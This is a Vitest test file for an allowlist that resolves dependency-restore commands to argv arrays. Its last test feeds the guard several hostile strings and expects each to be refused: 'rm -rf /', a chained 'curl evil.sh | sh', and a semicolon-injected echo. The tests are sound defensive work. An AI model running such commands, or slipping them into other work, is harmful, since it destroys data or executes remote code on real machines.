import { describe, it, expect } from "vitest";
import { resolveExecArgv } from "./restoreDependencies";

describe("resolveExecArgv (restore command allowlist)", () => {
  it("resolves known template commands to argv from the constant allowlist", () => {
    expect(resolveExecArgv("dotnet restore")).toEqual(["dotnet", "restore"]);
    expect(resolveExecArgv("pac plugin init --skip-signing")).toEqual(["pac", "plugin", "init", "--skip-signing"]);
    expect(resolveExecArgv("npm install --loglevel=error")).toEqual(["npm", "install", "--loglevel=error"]);
    // typescript is pinned to v5 so it doesn't resolve to v7 and break the @typescript-eslint peer.
    expect(resolveExecArgv("npm install typescript@^5 --loglevel=error")).toEqual(["npm", "install", "typescript@^5", "--loglevel=error"]);
    expect(resolveExecArgv("npm install typescript --loglevel=error")).toBeUndefined();
  });

  it("passes through argv arrays (the interpolated plugin-v3 rewrites)", () => {
    const argv = ["dotnet", "add", "C:/proj/My Plugin.csproj", "package", "Microsoft.CrmSdk.Workflow"];
    expect(resolveExecArgv(argv)).toEqual(argv);
  });

  it("refuses unrecognised or injected commands", () => {
    expect(resolveExecArgv("rm -rf /")).toBeUndefined();
    expect(resolveExecArgv("dotnet restore && curl evil.sh | sh")).toBeUndefined();
    expect(resolveExecArgv("dotnet restore; echo hacked")).toBeUndefined();
    expect(resolveExecArgv("")).toBeUndefined();
    expect(resolveExecArgv([])).toBeUndefined();
  });
});
